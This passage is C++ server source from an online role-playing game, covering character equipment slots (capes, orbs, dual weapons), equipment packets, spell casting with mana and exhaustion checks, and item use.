                              if( equippedItem->GetMark() & MARK_DELETION )
                              {
                                 equippedItem->DeleteUnit();
                                 equipped[ ipos ] = NULL;
                                 boEquip = FALSE;
                              }
                           }
                           else
                           {
                              boEquip = FALSE;
                           }							
                        }
                        else
                        {
                           TELL_PLAYER( 13 )
                              boEquip = FALSE;
                        }
                     break;
					 case cape:
					 {
						 if(!equipped[ipos])
						 {
							 // If user can equip this item
							 if( QueryEquip( equippedItem, 3, ipos, lpItemStructure ) )
							 {
								 bool bEquip = true;
								 bool bIsWings = lpItemStructure->weapon.ranged;
								 if(!bIsWings && equipped[Orbe1])
								 {
									 //Check if on Orbe pos is a BLOCK CApe Orbes.

									 _item *is = NULL;
									 equipped[ Orbe1 ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &is );

									 // If this is a bow
									 if( is == NULL || is->weapon.ranged )
									 {
										 bEquip = false;
									 }
								 }

								 if(!bEquip)
								 {
									 // Cant equip this orbe with CAPE...
									 TELL_PLAYER( 15237 );
									 boEquip = FALSE;
								 }
								 else
								 {
									 equipped[ipos] = equippedItem;
									 equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
									 if( equippedItem->GetMark() & MARK_DELETION )
									 {
										 equippedItem->DeleteUnit();
										 equipped[ ipos ] = NULL;
										 boEquip = FALSE;
									 }
								 }
							 }
							 else
							 {
								 boEquip = FALSE;
							 }							
						 }
						 else
						 {
							 TELL_PLAYER( 13 )
								 boEquip = FALSE;
						 }
					 }
					 break;
					 case Orbe1:
					 {
						 if(!equipped[ipos])
						 {
							 if( CanEquip( equippedItem, lpItemStructure ) )
							 {
								 bool bEquip = true;
								 bool bIsBlockOrbe = lpItemStructure->weapon.ranged;
								 if(bIsBlockOrbe && equipped[cape])
								 {
									 //Check if on cape position is  Wings or not...
									 //if is a cape NOT WINGS equiped, we stop this equipement...

									 _item *is = NULL;
									 // Get the item structure.
									 equipped[ cape ]->SendUnitMessage(MSG_OnGetUnitStructure, NULL, NULL, NULL, NULL, &is );

									 // If this is a bow
									 if( is == NULL || !is->weapon.ranged )
									 {
										 bEquip = false;
									 }
								 }

								 if(!bEquip)
								 {
									 // Cant equip this orbe with CAPE...
									 TELL_PLAYER( 15236 );
									 boEquip = FALSE;
								 }
								 else
								 {
									 equipped[ipos] = equippedItem;
									 equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
									 if( equippedItem->GetMark() & MARK_DELETION )
									 {
										 equippedItem->DeleteUnit();
										 equipped[ ipos ] = NULL;
										 boEquip = FALSE;
									 }
								 }
							 }
							 else
							 {
								 boEquip = FALSE;
							 }
						 }
						 else
						 {
							 TELL_PLAYER( 13 );
							 // Otherwise re-add the object in the backpack
							 boEquip = FALSE;
						 }
					 }
					 break;
                     default: // Otherwise, if it's a normal position
                        if(!equipped[ipos])
                        {
                           if( CanEquip( equippedItem, lpItemStructure ) )
                           {


                              LPUSER_SKILL userSkill = GetSkill(__SKILL_TWOWEAPONS   );
                              if(lpItemStructure->item_type == 1/*WEAPON*/ && lpItemStructure->equip_position == 9 /*weapon_left*/ && userSkill == NULL && !lpItemStructure->weapon.ranged )
                              {
                                 //try to equip dual weapon without skill...                                 
                                 TELL_PLAYER( 12962 );
                                 boEquip = FALSE;
                              }
                              else
                              {
                                 equipped[ipos] = equippedItem;
                                 equippedItem->SendUnitMessage(MSG_OnDisturbed, equippedItem, NULL, this, &dwCallReason );
                                 if( equippedItem->GetMark() & MARK_DELETION )
                                 {
                                    equippedItem->DeleteUnit();
                                    equipped[ ipos ] = NULL;
                                    boEquip = FALSE;
                                 }
                              }
                           }
                           else
                           {
                              boEquip = FALSE;
                           }
                        }
                        else
                        {
                           TELL_PLAYER( 13 );
                           // Otherwise re-add the object in the backpack
                           boEquip = FALSE;
                        }
                        break;
                     }
                  }

                  if( !boEquip )
                  {
                     // Otherwise re-add the object in the backpack
                     addToBackpack = true;
                  }
                  else
                  {

                     // Sending an OnEquip message for boosts
                     equippedItem->SendUnitMessage(MSG_OnEquip, equippedItem, NULL, this );

                     // Send stat update
                     
                     TFCPacket sendingS1;
                     PacketStatus(sendingS1);
                     SendPlayerMessage(sendingS1);

                     TFCPacket sendingS2;
                     PacketStatus2(sendingS2);	
                     SendPlayerMessage(sendingS2);
                     
                     TFCPacket sendingSkill;
                     PacketSkills(sendingSkill);
                     SendPlayerMessage(sendingSkill);

                     // Shoot the puppet packet to all on-screen.
                     TFCPacket sending;
                     if( IsPuppet() )
                     {
                        PacketPuppetInfo ( sending );
                        Broadcast::BCast( GetWL(), _DEFAULT_RANGE, sending );
                     }

                     // Send the equipment.
                     sending.Destroy();
                     packet_equiped( sending );
                     SendPlayerMessage( sending );
                  }
               }
               else
               {
                  SendSystemMessage( _STR( 7247, GetLang() ) );
                  addToBackpack = true;
               }
            }
         }
         else
         {                
            // Send same message.
            TELL_PLAYER( 471 );
            addToBackpack = true;
         }
         if( addToBackpack )
         {
            AddToBackpack( equippedItem );
         }
      }
      backpack->Unlock();
   }	
   return 0;
}
/******************************************************************************/
// Unequip an item (from worn to backpack)
char Character::unequip_object(
                               unsigned char ipos, // The position to unequip.
                               bool remove ,        // Removes the item but does not put it in the backpack
                               bool gameop
                               )
                               /******************************************************************************/
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->unequip_object( ipos,remove, true );

      TFCPacket sendingE;
      gameopContext->packet_equiped( sendingE,true );
      SendPlayerMessage( sendingE );

      TFCPacket sendingBP;
      sendingBP << (RQ_SIZE)RQ_ViewBackpack2;
      sendingBP << (char)0;
      sendingBP << (long)GetID();
      gameopContext->PacketBackpack(sendingBP, true);
      SendPlayerMessage( sendingBP );

      return 0;
   }

   Disturbed();

   // This avoids any attempt to se beyond existing equiping positions
   if(ipos >= 0 && ipos < EQUIP_POSITIONS && ipos != rings && ipos != weapon)
   {
      Unit *lpuItem = equipped[ ipos ];

      // If there is an equipped unit.
      if( lpuItem )
      {
         /// *****S_NMS_DEATH 
         if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
         {
            //le PJ est mort, il ne peu pas bouger...
            // Send stat update.
            TFCPacket sending;
            if( IsPuppet() )
            {
               packet_equiped ( sending );
               SendPlayerMessage( sending );
            }
            return 0;
         }
         /// *****E_NMS_DEATH 

         for(int i=0;i<theApp.m_aStillItems.GetSize();i++)
         {
            if(theApp.m_aStillItems[i] == lpuItem->GetStaticReference())
            {
               TFCPacket sending;
               if( IsPuppet() )
               {
                  packet_equiped ( sending );
                  SendPlayerMessage( sending );
               }
               return 0; // this item cant unequip...
            }
         }

         // If two handed weapon.
         if( ( ipos == weapon_right || ipos == weapon_left ) && equipped[ weapon_right ] == equipped[ weapon_left ] )
         {
            // Remove item from both equip positions.
            equipped[ weapon_right ] = equipped[ weapon_left ] = NULL;
         }
         equipped[ ipos ] = NULL;

         // Remove boost associated with unit
         switch( ipos )
         {
         case weapon_right:
            RemoveBoost( BOOST_EQUIP_WEAPON1_DAM );
            RemoveBoost( BOOST_EQUIP_WEAPON1_ATTACK );
            break;				
         case weapon_left:
            RemoveBoost( BOOST_EQUIP_WEAPON2_DAM );
            RemoveBoost( BOOST_EQUIP_WEAPON2_ATTACK );
            break;
         case two_hands:
            RemoveBoost( BOOST_EQUIP_WEAPON1_DAM );
            RemoveBoost( BOOST_EQUIP_WEAPON1_ATTACK );
            break;
         case body:		RemoveBoost( BOOST_EQUIP_ARMOR_BODY_DODGE ) ;break;
         case feet:		RemoveBoost( BOOST_EQUIP_ARMOR_FEET_DODGE ) ;break;
         case gloves:	RemoveBoost( BOOST_EQUIP_ARMOR_GLOVES_DODGE ) ;break;
         case helm:		RemoveBoost( BOOST_EQUIP_ARMOR_HELM_DODGE ) ;break;
         case legs:		RemoveBoost( BOOST_EQUIP_ARMOR_LEGS_DODGE ) ;break;
         case cape:	    RemoveBoost( BOOST_EQUIP_ARMOR_SLEEVES_DODGE ) ;break;
         }

         // Remove the item's boost.
         //RemoveBoost( lpItemStructure->boost.wBoostID );
         lpuItem->SendUnitMessage(MSG_OnUnequip, lpuItem, NULL, this );

         if( !remove )
         {
            AddToBackpack( static_cast< Objects * >( lpuItem ) );
         }

         // Send stat update.

         TFCPacket sendingS1;
         PacketStatus(sendingS1);
         SendPlayerMessage(sendingS1);

         TFCPacket sendingS2;
         PacketStatus2(sendingS2);	
         SendPlayerMessage(sendingS2);

         TFCPacket sendingSkill;
         PacketSkills(sendingSkill);
         SendPlayerMessage(sendingSkill);
         
         // Shoot the puppet packet to all on-screen.
         TFCPacket sending;
         if( IsPuppet() )
         {
            PacketPuppetInfo ( sending );
            //NMNMNM 20
            Broadcast::BCast( GetWL(), 40, sending );
         }

         sending.Destroy();
         packet_equiped( sending );
         SendPlayerMessage( sending );
      }
   }	
   return 0;
}
/******************************************************************************/
// Packets a single equip position
void Character::PacketSingleEquip(
                                  BYTE equip_pos,	// The equip position
                                  TFCPacket &sending	// The packet
                                  )
                                  /******************************************************************************/
{
   Unit *lpuUnit = equipped[ equip_pos ];
   if( lpuUnit )
   {
      Objects *lpuObject = static_cast< Objects * >( lpuUnit );
      TRACE( "..%u..", equip_pos );
      sending << (long)lpuUnit->GetID();
      sending << (short)lpuUnit->GetAppearance();
      sending << (short)lpuUnit->GetStaticReference();
      sending << (short)static_cast< Objects * >( lpuUnit )->GetQty();
      // Only unique items may have charges.
      if( lpuObject->IsUnique() )
      {
         sending << (long)lpuObject->ViewFlag( __FLAG_CHARGES );
      }
      else
      {
         sending << (long)0;
      }
      sending << lpuUnit->GetName( GetLang() );
   }
   else
   {
      CString csNull;
      csNull = "";
      sending << (long)0;
      sending << (short)0;
      sending << (short)0;
      sending << (short)0;
      sending << (long)0;
      sending << (CString)csNull;
   }
}
/******************************************************************************/
// Puts the equiped objects in a packet
void Character::packet_equiped(TFCPacket &packet, bool gameop)
/******************************************************************************/
{
   if( gameopContext != NULL && !gameop )
   {
      gameopContext->packet_equiped( packet, true );
      return;
   }

   // scans all equiped positions
   packet << (RQ_SIZE)RQ_ViewEquiped;
   if( RangedAttack() )
   {
      packet << (char)1;
   }
   else
   {
      packet << (char)0;
   }

   PacketSingleEquip( body, packet );
   PacketSingleEquip( gloves, packet );
   PacketSingleEquip( helm, packet );
   PacketSingleEquip( legs, packet );
   PacketSingleEquip( bracelets, packet );
   PacketSingleEquip( necklace, packet );
   PacketSingleEquip( weapon_right, packet );
   PacketSingleEquip( weapon_left, packet );
   PacketSingleEquip( ring1, packet );
   PacketSingleEquip( ring2, packet );
   PacketSingleEquip( belt, packet );
   PacketSingleEquip( cape, packet );
   PacketSingleEquip( feet, packet );
   PacketSingleEquip( Orbe1, packet );
   
}
/******************************************************************************/
// Memorizes a spell in the memorize box
char Character::memorize_spell(unsigned char where, unsigned short which_spell, unsigned long GetID)
/******************************************************************************/
{
   return -1;
}
/******************************************************************************/
// Spends mana.
BOOL Character::UseSpellEnergy(WORD wMana) // How much mana to spend.
/******************************************************************************/
{
   int nCurrentEnergy = GetMana();

   // Use mana
   nCurrentEnergy -= wMana;	    
   nCurrentEnergy = nCurrentEnergy < 0 ? 0 : nCurrentEnergy;
   SetMana( nCurrentEnergy );	   

   return TRUE;
}
/******************************************************************************/
// This function allows a user to cast a spell
BOOL Character::CastSpell(
                          WORD wSpellID,		// The spell's ID.
                          Unit *uTarget		// The target unit of the spell 
                          )
                          /******************************************************************************/
{	
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }


   BOOL boReturn = FALSE;	

   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE|DISTURB_UNHIDE);
   DispellInvisibility();

   TRACE( "\r\nReceive spell ID=%u", wSpellID );

   LPSPELL_STRUCT lpSpell     = SpellMessageHandler::GetSpell( wSpellID );
   LPUSER_SKILL   lpUserSpell = GetSkill( wSpellID );

   bool restorePreviousState = false;

   // If spell exists and user has it
   if( lpSpell != NULL && lpUserSpell != NULL )
   {
      // If this is an attack spell which does not target self.
      if( lpSpell->attackSpell && uTarget != this )
      {
      }
      // If this is a non-attack spell and previous autocombat is spell.
      else if( !lpSpell->attackSpell && autoCombatAttack.attackType == Attack::spell )
      {
         // Restore previous combat mode.            
         restorePreviousState = true;
      }

      EXHAUST sExhaust = GetExhaust();

      // If player isn't exhausted.
      if( sExhaust.mental <= TFCMAIN::GetRound() )
      {
         WORD wManaCost = static_cast< WORD >( lpSpell->bfManaCost.GetBoost( this, uTarget ) );

         // If player has enough mana.
         if( GetMana() >= wManaCost )
         {
            if( uTarget == NULL )
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u (without target).",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  (LPCTSTR)uTarget->GetName( _DEFAULT_LNG )
                  LOG_
            }
            else
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u on target %s.",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  (LPCTSTR)uTarget->GetName( _DEFAULT_LNG )
                  LOG_
            }

            ResetArenaINACTIF();

            // If the target of the spell is self and this is an attack spell.
            // Or if the spell is not an attack spell and the current auto-combat
            // mode is spell mode.
            if( lpSpell->attackSpell && uTarget == this/* || !lpSpell->attackSpell && autoCombatAttack.attackType == Attack::spell*/ )
            {
               StopAutoCombat();
            }

            // Activate the spell!
            boReturn = SpellMessageHandler::ActivateSpell(
               wSpellID,			
               this,
               NULL,
               uTarget,
               uTarget->GetWL()
               );

            // If the spell didn't fail
            if( boReturn )
            {
               // Deduct mana.
               UseSpellEnergy( wManaCost );
            }
            else
            {
               if( !restorePreviousState )
               {
                  // Stop autocombat if the spell did not function.
                  StopAutoCombat();
               }
            }
         }
         else
         {
            // If player ran out of mana in casting autocombat.
            if( autoCombatAttack.attackType == Attack::spell )
            {
               StopAutoCombat();
            }

            TELL_PLAYER( 19 );
         }
      }
      else
      {
         TELL_PLAYER( 18 );
      }

      if( restorePreviousState )
      {
         RestorePreviousAutoCombatState();
      }
   }
   return boReturn;
}
/******************************************************************************/
BOOL Character::CastSpellNoCheck(WORD wSpellID,Unit *uTarget)
{	
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 
   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   BOOL boReturn = FALSE;	

   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE|DISTURB_UNHIDE);
   DispellInvisibility();

   TRACE( "\r\nReceive spell ID=%u", wSpellID );

   LPSPELL_STRUCT lpSpell     = SpellMessageHandler::GetSpell( wSpellID );

   bool restorePreviousState = false;

   // If spell exists and user has it
   if( lpSpell != NULL)
   {

      // If this is an attack spell which does not target self.
      if( lpSpell->attackSpell && uTarget != this )
      {
      }
      // If this is a non-attack spell and previous autocombat is spell.
      else if( !lpSpell->attackSpell && autoCombatAttack.attackType == Attack::spell )
      {
         // Restore previous combat mode.            
         restorePreviousState = true;
      }

      EXHAUST sExhaust = GetExhaust();

      // If player isn't exhausted.
      if( sExhaust.mental <= TFCMAIN::GetRound() )
      {
         WORD wManaCost = static_cast< WORD >( lpSpell->bfManaCost.GetBoost( this, uTarget ) );

         // If player has enough mana.
         if( GetMana() >= wManaCost )//Valide pas la mana de ce spell...
         {
            if( uTarget == NULL )
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u (without target).",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  (LPCTSTR)uTarget->GetName( _DEFAULT_LNG )
                  LOG_
            }
            else
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u on target %s.",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  (LPCTSTR)uTarget->GetName( _DEFAULT_LNG )
                  LOG_
            }

            // If the target of the spell is self and this is an attack spell.
            // Or if the spell is not an attack spell and the current auto-combat
            //    mode is spell mode.
            if( lpSpell->attackSpell && uTarget == this)
            {
               StopAutoCombat();
            }


            // Activate the spell!
            boReturn = SpellMessageHandler::ActivateSpell(
               wSpellID,			
               this,
               NULL,
               uTarget,
               uTarget->GetWL()
               );
            // If the spell didn't fail
            if( boReturn )
            {
               // Deduct mana.
               //UseSpellEnergy( wManaCost ); pas de mana efefct en direct no check
            }
            else
            {
               if( !restorePreviousState )
               {
                  // Stop autocombat if the spell did not function.
                  StopAutoCombat();
               }
            }
         }
         
         else
         {
            // If player ran out of mana in casting autocombat.
            if( autoCombatAttack.attackType == Attack::spell )
            {
               StopAutoCombat();
            }

            TELL_PLAYER( 19 );
         }
      }
      else
      {
         TELL_PLAYER( 18 );
      }

      if( restorePreviousState ){
         RestorePreviousAutoCombatState();
      }
   }

   return boReturn;
}

BOOL Character::CastSpellNoCheckFull(WORD wSpellID,Unit *uTarget)
{	
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   BOOL boReturn = FALSE;	

   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE|DISTURB_UNHIDE);
   DispellInvisibility();

   TRACE( "\r\nReceive spell ID=%u", wSpellID );

   LPSPELL_STRUCT lpSpell     = SpellMessageHandler::GetSpell( wSpellID );

   bool restorePreviousState = false;

   // If spell exists and user has it
   if( lpSpell != NULL)
   {

      // If this is an attack spell which does not target self.
      if( lpSpell->attackSpell && uTarget != this )
      {
      }
      // If this is a non-attack spell and previous autocombat is spell.
      else if( !lpSpell->attackSpell && autoCombatAttack.attackType == Attack::spell )
      {
         // Restore previous combat mode.            
         restorePreviousState = true;
      }

      EXHAUST sExhaust = GetExhaust();

      // If player isn't exhausted.
      //if( sExhaust.mental <= TFCMAIN::GetRound() )
      {
         WORD wManaCost = static_cast< WORD >( lpSpell->bfManaCost.GetBoost( this, uTarget ) );

         // If player has enough mana.
         //if( GetMana() >= wManaCost )//Valide pas la mana de ce spell...
         {
            if( uTarget == NULL )
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u (without target).",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  (LPCTSTR)uTarget->GetName( _DEFAULT_LNG )
                  LOG_
            }
            else
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u on target %s.",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  (LPCTSTR)uTarget->GetName( _DEFAULT_LNG )
                  LOG_
            }

            // If the target of the spell is self and this is an attack spell.
            // Or if the spell is not an attack spell and the current auto-combat
            //    mode is spell mode.
            if( lpSpell->attackSpell && uTarget == this)
            {
               StopAutoCombat();
            }


            // Activate the spell!
            boReturn = SpellMessageHandler::ActivateSpell(
               wSpellID,			
               this,
               NULL,
               uTarget,
               uTarget->GetWL(),TRUE
               );
            // If the spell didn't fail
            if( boReturn )
            {
               // Deduct mana.
               //UseSpellEnergy( wManaCost ); pas de mana efefct en direct no check
            }
            else
            {
               if( !restorePreviousState )
               {
                  // Stop autocombat if the spell did not function.
                  StopAutoCombat();
               }
            }
         }
         /*
         else
         {
         // If player ran out of mana in casting autocombat.
         if( autoCombatAttack.attackType == Attack::spell )
         {
         StopAutoCombat();
         }

         TELL_PLAYER( 19 );
         }
         */
      }
     //else
     // {
     //    TELL_PLAYER( 18 );
     // }

      if( restorePreviousState ){
         RestorePreviousAutoCombatState();
      }
   }

   return boReturn;
}


// This function allows a user to cast a spell
/******************************************************************************/
BOOL Character::CastSpellDirect(WORD wSpellID,Unit *uTarget)
{	
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }

   BOOL boReturn = FALSE;	

   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE|DISTURB_UNHIDE);
   DispellInvisibility();

   TRACE( "\r\nReceive spell ID=%u", wSpellID );

   LPSPELL_STRUCT lpSpell     = SpellMessageHandler::GetSpell( wSpellID );

   // If spell exists and user has it
   if( lpSpell != NULL)
   {
      // Activate the spell!
      boReturn = SpellMessageHandler::ActivateSpell(wSpellID,this,NULL,uTarget,uTarget->GetWL());
   }

   return boReturn;
}
/******************************************************************************/
// This function allows a user to cast a spell
BOOL Character::CastSpell(
                          WORD wSpellID,		// The spell's ID.
                          WorldPos wlPos		// WorldPos of target spell area. 
                          )
                          /******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return FALSE;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return FALSE;
   }


   BOOL boReturn = FALSE;

   Disturbed(DISTURB_CLOSECHEST|DISTURB_CLOSETRADE|DISTURB_UNHIDE);
   DispellInvisibility();

   TRACE( "\r\nReceive spell ID=%u", wSpellID );

   LPSPELL_STRUCT lpSpell     = SpellMessageHandler::GetSpell( wSpellID );
   LPUSER_SKILL   lpUserSpell = GetSkill( wSpellID );

   // If spell exists and user has it
   if( lpSpell != NULL && lpUserSpell != NULL )
   {
      EXHAUST sExhaust = GetExhaust();

      // If player isn't exhausted.
      if( sExhaust.mental <= TFCMAIN::GetRound() )
      {
         // Get the mana cost.
         WORD wManaCost = static_cast< WORD >( lpSpell->bfManaCost.GetBoost( this ) );

         if( GetMana() >= wManaCost )
         {
            if( wlPos.X == 0 && wlPos.Y == 0 )
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u on himself",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  wlPos.X,
                  wlPos.Y,
                  GetWL().world                    
                  LOG_
            }
            else
            {
               _LOG_DEBUG
                  LOG_DEBUG_LVL4,
                  "Player %s cast spell ID %u on position %u, %u, %u.",
                  (LPCTSTR)GetTrueName(),
                  wSpellID,
                  wlPos.X,
                  wlPos.Y,
                  GetWL().world                    
                  LOG_
            }

            ResetArenaINACTIF();

            // Activate the spell!
            boReturn = SpellMessageHandler::ActivateSpell(
               wSpellID,		
               this,
               NULL,
               NULL,
               wlPos
               );

            if( boReturn )
            {
               // Deduct mana.
               UseSpellEnergy( wManaCost );
            }
         }
         else
         {
            TELL_PLAYER( 19 );
         }
      }
      else
      {
         TELL_PLAYER( 18 );
      }
   }

   return boReturn;
}

BOOL Character::CastSpellPosSystem(WORD wSpellID,WorldPos wlPos)
{
   BOOL boReturn = FALSE;
   LPSPELL_STRUCT lpSpell     = SpellMessageHandler::GetSpell( wSpellID );
   
   // If spell exists and user has it
   if( lpSpell != NULL)
   {
      // Activate the spell!
      boReturn = SpellMessageHandler::ActivateSpell(wSpellID,this,NULL,NULL,wlPos);
   }
   return boReturn;
}


/******************************************************************************/
//  Uses an item. Also used for robbing.
void Character::use_item(
                         unsigned long which_item, // The ID of the item to use/rob.
                         Unit *TargetPlayer        // Object's usage target.
                         )
                         /******************************************************************************/
{
   /// *****S_NMS_DEATH 
   if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
   {
      //le PJ est mort, il ne peu pas bouger...
      return ;
   }
   /// *****E_NMS_DEATH 

   if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
   {
      //le PJ ets en prison plus de SPELL
      return ;
   }

   const int InBackpack = 1;
   const int InEquip = 2;

   Disturbed();

   BOOL done = FALSE;
   DWORD dwReason = OBJECT_DISTURB_USE;

   int nWhere;

   if(!backpack)
   {
      return;
   }

   Objects *lpuUnit = NULL;
   backpack->Lock();
   backpack->ToHead();
   while(backpack->QueryNext() && !done)
   {
      lpuUnit = static_cast< Objects *>( backpack->Object() );
      if( lpuUnit->GetID() == which_item)
      {
         lpuUnit->SendUnitMessage(MSG_OnDisturbed, lpuUnit, this, this, &dwReason );
         if( lpuUnit->GetMark() & MARK_DELETION )
         {				
            // Update the quantity.
            lpuUnit->Remove();
            if( lpuUnit->GetQty() == 0 )
            {
               backpack->Object()->DeleteUnit();
               backpack->Remove();
            }
         }
         else
         {
            done = TRUE;
         }
      }

   }
   backpack->Unlock();

   // if it wasn't found in the backpack
   if( !done )
   {
      // checks for any equiped spellbook
      int i;
      for(i = 0; i < EQUIP_POSITIONS; i++)
      {
         if(equipped[i])
         {
            if( equipped[i]->GetID() == which_item)
            {
               // if it is equiped, use it!
               lpuUnit = static_cast< Objects * >( equipped[i] );
               lpuUnit->SendUnitMessage(MSG_OnDisturbed, lpuUnit, this, this, &dwReason );
               if( lpuUnit->GetMark() & MARK_DELETION )
               {
                  lpuUnit->DeleteUnit();
                  equipped[ i ] = NULL;
               }
               else
               {
                  done = TRUE;
                  nWhere = i;
               }
            }
         }
      }
   }
   else
   {
      nWhere = 0xFFFF;
   }

   // If the item wasn't found in the equipment.
   if( !done )
   {
      return;
   }

   bool bCanExecute = true;
   for(int i=0;i<theApp.m_aDelayItems.GetSize();i++)
   {
      if(lpuUnit->GetStaticReference() == theApp.m_aDelayItems[i].uiID)
      {
         time_t tCurTime  =  time(NULL);
         time_t tLastTime =  ViewFlag(theApp.m_aDelayItems[i].uiFlag);
         if(tCurTime - tLastTime > theApp.m_aDelayItems[i].uiDelay)
         {
            SetFlag(theApp.m_aDelayItems[i].uiFlag,tCurTime);
            i = theApp.m_aDelayItems.GetSize();
         }
         else
         {
            CString strMessage;
            strMessage.Format(_STR( 15371, GetLang() ));
            SendSystemMessage(strMessage);
            bCanExecute = false;
            i = theApp.m_aDelayItems.GetSize();
         }
      }
   }
   if(!bCanExecute)
      return;
   

   DWORD itemUsed = 0;
   lpuUnit->SendUnitMessage(MSG_OnUse, lpuUnit, this, TargetPlayer, NULL, &itemUsed );

   // If the itemUsed flag wasn't set.
   if( itemUsed == 0 )
   {
      // Tell the user that using the item did nothing.
      TELL_PLAYER( 7683 );
   }

   // If unit must not be deleted.
   if( !( lpuUnit->GetMark() & MARK_DELETION ) )
   {
      return;
   }

   // Item must be removed from backpack
   if( nWhere == 0xFFFF )
   {
      // Find item
      backpack->Lock();
      backpack->ToHead();
      done = FALSE;
      while(backpack->QueryNext() && !done )
      {
         Objects *backpackItem = static_cast< Objects * >( backpack->Object() );

         // If object was found
         if( lpuUnit == backpackItem )
         {
            backpackItem->Remove();
            if( backpackItem->GetQty() == 0 )
            {
               // Remove item from backpack.                                
               backpack->Object()->DeleteUnit();
               backpack->Remove();
               lpuUnit = NULL;
            }

            done = TRUE;
         }
      }
      backpack->Unlock();

      // If backpack changed
      if( done )
      {
         if(lpuUnit && lpuUnit->GetQty()>0)
         {
            TFCPacket sending;
            sending << (RQ_SIZE)RQ_UpdateBackpackAfterUse;
            sending << (char)0;	
            sending << (long)GetID();


            sending << (short)lpuUnit->GetAppearance();
            sending << (long) lpuUnit->GetID();
            sending << (short)lpuUnit->GetStaticReference();
            sending << (long) lpuUnit->GetQty();

            // Only unique items may have charges.
            if( lpuUnit->IsUnique() )
            {
               sending << (long)lpuUnit->ViewFlag( __FLAG_CHARGES );
            }
            else
            {
               sending << (long)0;
            }
            SendPlayerMessage( sending );
         }
         else
         {
            // Update user's backpack.
            TFCPacket sending;
            sending << (RQ_SIZE)RQ_ViewBackpack2;
            sending << (char)0;	// Player may not want to view its backpack.
            sending << (long)GetID();
            PacketBackpack( sending );
            SendPlayerMessage( sending );
         }
       // Item must be removed from its equip position.
      }
   }
   else
   {
      // Delete the equipped item
      if( equipped[ nWhere ] != NULL )
      {
         lpuUnit = static_cast< Objects * >( equipped[ nWhere ] );
         equipped[ nWhere ] = NULL;
         lpuUnit->DeleteUnit();
      }           
   }
}

void Character::use_item2(
						 unsigned long which_item, // The ID of the item to use/rob.
						 Unit *TargetPlayer        // Object's usage target.
						 )
						 /******************************************************************************/
{
	/// *****S_NMS_DEATH 
	if( ViewFlag( __FLAG_NMS_PLAYER_DEATH ) != 0 )
	{
		//le PJ est mort, il ne peu pas bouger...
		return ;
	}
	/// *****E_NMS_DEATH 

	if(ViewFlag(__FLAG_NMS_EN_PRISON) == 1)
	{
		//le PJ ets en prison plus de SPELL
		return ;
	}

	const int InBackpack = 1;
	const int InEquip = 2;

	Disturbed();

	BOOL done = FALSE;
	DWORD dwReason = OBJECT_DISTURB_USE;

	int nWhere;

	if(!backpack)
	{
		return;
	}

	Objects *lpuUnit = NULL;
	backpack->Lock();
	backpack->ToHead();
	while(backpack->QueryNext() && !done)
	{
		lpuUnit = static_cast< Objects *>( backpack->Object() );
		if( lpuUnit->GetID() == which_item)
		{
			lpuUnit->SendUnitMessage(MSG_OnDisturbed, lpuUnit, this, TargetPlayer, &dwReason );
			if( lpuUnit->GetMark() & MARK_DELETION )
			{				
				// Update the quantity.
				lpuUnit->Remove();
				if( lpuUnit->GetQty() == 0 )
				{
					backpack->Object()->DeleteUnit();
